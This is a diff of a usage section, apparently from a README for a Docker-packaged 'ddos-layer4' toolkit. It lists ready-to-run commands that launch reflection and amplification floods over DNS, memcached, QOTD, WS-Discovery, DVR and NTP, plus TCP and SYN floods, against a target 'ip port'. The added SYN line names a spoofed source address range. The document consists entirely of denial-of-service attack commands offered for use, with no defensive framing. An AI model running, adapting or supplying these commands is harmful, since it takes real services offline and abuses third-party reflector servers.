@@ -13,16 +13,18 @@
 
 ### ddos-layer4使用
 
-	docker exec -it ddos-layer4 ./dns ip port dns.txt 1 -1 60 &
+	docker exec -it ddos-layer4 ./dns ip port dns.txt 1 -1 60
 
-	docker exec -it ddos-layer4 ./meme ip port meme.txt 1 -1 60 &
+	docker exec -it ddos-layer4 ./meme ip port meme.txt 1 -1 60
 
-	docker exec -it ddos-layer4 ./qotd ip port qotd.txt 1 -1 60 &
+	docker exec -it ddos-layer4 ./qotd ip port qotd.txt 1 -1 60
 
-	docker exec -it ddos-layer4 ./wsd ip port wsd.txt 1 -1 60 &
+	docker exec -it ddos-layer4 ./wsd ip port wsd.txt 1 -1 60
 
-	docker exec -it ddos-layer4 ./dvr ip port dvr.txt 1 -1 60 &
+	docker exec -it ddos-layer4 ./dvr ip port dvr.txt 1 -1 60
 
-	docker exec -it ddos-layer4 ./ntp ip port ntp.txt 1 -1 60 &
+	docker exec -it ddos-layer4 ./ntp ip port ntp.txt 1 -1 60
 
-	docker exec -it ddos-layer4 ./tcp ip port 1 -1 60 &
+	docker exec -it ddos-layer4 ./tcp ip port 1 -1 60
+
+ 	docker exec -it ddos-layer4 ./syn ip port 1 -1 60 8.128.0.0/10
